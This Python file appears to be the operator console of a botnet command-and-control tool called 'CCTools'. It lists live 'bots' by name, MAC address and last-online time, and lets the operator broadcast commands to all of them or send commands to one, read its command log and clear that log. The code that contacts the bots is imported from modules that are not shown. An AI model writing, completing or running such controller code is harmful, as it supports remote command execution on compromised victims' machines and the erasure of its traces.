import os
from termcolor import colored
from utils import jumbo_text
from alive import get_bots
from tabulate import tabulate
from commander import send_commands
from log_handler import get_command_log, clear_command_log


def main():
    while True:
        alive_bots = get_bots()
        table_rows = [[0, "All bots", "-", "-"]]
        table_rows += [[i + 1,
                       b['name'],
                        b['mac'],
                        b['simplified_update_date']] for i, b in enumerate(alive_bots)]

        os.system("clear")
        print(colored(jumbo_text("CCTools"), "green"))
        print("\nWho do you want to interact with?\n")
        print(tabulate(table_rows,
                       headers=['No.', 'Name', 'MAC address', 'Last online']))

        print("\n(Press Ctrl+C to exit)\n")

        choice = input("\nEnter your choice: ")

        if choice == "0":
            send_commands(None, broadcast=True)

        if choice.isdigit() and int(choice) <= len(alive_bots):
            chosen_bot = alive_bots[int(choice) - 1] if len(alive_bots) > 0 else None

            os.system("clear")
            print("\nWhat do you want to do with " +
                  colored(chosen_bot["name"], attrs=['bold']) + "?\n")
            print(tabulate([['1', 'Send a command'],
                            ['2', 'Get command log'],
                            ['3', 'Clear command log'],
                            ['4', 'Go back'],
                            ['5', 'Exit']],
                           headers=['No.', 'Action']))

            action = input("\nEnter your choice: ")

            if action == "1":
                send_commands(chosen_bot)
            elif action == "2":
                get_command_log(chosen_bot)
            elif action == "3":
                clear_command_log(chosen_bot)
            elif action == "4":
                continue
            elif action == "5":
                exit()


if __name__ == "__main__":
    main()
